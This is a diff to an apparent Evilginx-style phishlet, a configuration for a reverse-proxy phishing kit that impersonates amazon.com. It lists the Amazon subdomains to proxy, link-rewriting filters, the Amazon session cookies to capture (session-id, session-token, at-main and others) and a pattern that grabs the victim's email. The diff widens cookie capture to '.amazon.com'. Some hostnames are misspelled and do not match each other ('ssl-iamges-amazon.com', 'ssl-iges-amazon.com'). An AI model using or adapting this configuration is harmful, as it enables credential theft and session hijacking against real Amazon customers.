@@ -1,6 +1,6 @@
 name: 'amazon'
 author: '@customsync'
-min_ver: '2.0.0'
+min_ver: '2.1.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'amazon.com', session: true, is_landing: true}
   - {phish_sub: 'fls-na', orig_sub: 'fls-na', domain: 'amazon.com', session: false, is_landing: false}
@@ -13,8 +13,8 @@ sub_filters:
   - {hostname: 'images-na.ssl-iamges-amazon.com', sub: 'images-na', domain: 'ssl-iges-amazon.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
   - {hostname: 'images-na.ssl-iamges-amazon.com', sub: 'images-na', domain: 'ssl-images-amazon.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
 auth_tokens:
-  - domain: 'amazon.com'
-    keys: ['at-main','lc-main','sess-at-main','session-id','session-id-time','session-token','sst-main','ubid-main','x-main','x-wl-uid','skin','a-ogbcbff']
+  - domain: '.amazon.com'
+    keys: ['at-main','lc-main','sess-at-main','session-id','session-id-time','session-token','sst-main','ubid-main','x-main','skin','a-ogbcbff']
 user_regex:
   key: 'email'
   re: '(.*)'
